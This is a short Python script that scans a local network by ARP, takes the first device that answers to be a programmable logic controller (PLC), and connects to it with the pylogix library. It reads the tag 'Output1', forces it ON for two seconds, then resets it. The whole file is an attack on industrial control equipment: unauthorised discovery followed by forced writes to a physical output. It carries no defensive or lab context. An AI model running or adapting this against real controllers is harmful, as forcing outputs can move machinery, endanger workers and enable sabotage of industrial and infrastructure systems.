import scapy.all as scapy
from pylogix import PLC
import time

# Function to discover PLC's IP
def find_plc_ip(subnet="192.168.1.0/24"):
    print("[*] Scanning network for PLC devices...")
    
    # ARP Request to find devices on the network
    arp_request = scapy.ARP(pdst=subnet)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    
    for answer in answered_list:
        ip = answer[1].psrc
        mac = answer[1].hwsrc
        print(f"[+] Found device - IP: {ip}, MAC: {mac}")
        
        # Returning first device found (assuming it's the PLC)
        return ip
    
    print("[-] No PLC found on the network.")
    return None

# Function to override I/O image
def manipulate_plc_io(plc_ip):
    print(f"[+] Connecting to PLC at {plc_ip}...")

    with PLC(plc_ip) as comm:
        # Test if PLC is reachable
        if not comm:
            print("[-] Connection to PLC failed.")
            return
        
        # Read current state of an I/O point (Assuming 'Output1' control tag)
        response = comm.Read('Output1')
        if response.Status == 'Success':
            print(f"[+] Current state of Output1: {response.Value}")
        else:
            print("[-] Failed to read Output1.")
            return
        
        # Modify an I/O value forcibly (Override an output)
        print("[*] Forcing Output1 to ON state...")
        comm.Write('Output1', 1)
        time.sleep(2)  # Small delay to hold value
        
        # Verify change
        new_status = comm.Read('Output1')
        if new_status.Status == 'Success':
            print(f"[+] Output1 has been forced to: {new_status.Value}")
        else:
            print("[-] Verification failed.")
        
        # Optional: Reset I/O to avoid persistent modification
        comm.Write('Output1', 0)
        print("[+] Output1 has been reset to OFF.")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        manipulate_plc_io(plc_ip)
    else:
        print("[-] Unable to identify PLC. Exiting.")